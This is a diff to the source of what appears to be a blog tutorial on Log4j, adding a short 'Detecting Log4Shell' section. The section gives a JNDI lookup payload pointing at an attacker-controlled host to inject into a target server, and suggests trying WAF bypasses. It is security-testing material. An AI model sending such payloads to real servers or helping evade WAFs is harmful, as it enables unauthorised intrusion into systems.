@@ -1,5 +1,5 @@
 ---
-title: Recreate and exploit the Log4j vulnerability
+title: Recreate, detect and exploit the Log4j vulnerability
 tags: [CVE, Log4j, PoC]
 style: border
 color: warning
@@ -172,3 +172,6 @@ The server will then log the chat, evaluate the lookup function, make a connecti
 </figure>
 
 And that's it. Hope you have fun exploiting Log4J!
+
+# 4. Detecting Log4Shell
+Detect log4shell is easy. You only need to use the `${jndi:ldap://www.server-you-control.com}` as user inputs to the target server. If there is a ping back or a DNS look up for your server after the payload is sent then there is a high chance that the targe server is vulnerable. In case there is a WAF, it will block this malicious payload but there are a bunch of bypasses on Twitter for each specific WAFs that you can try.
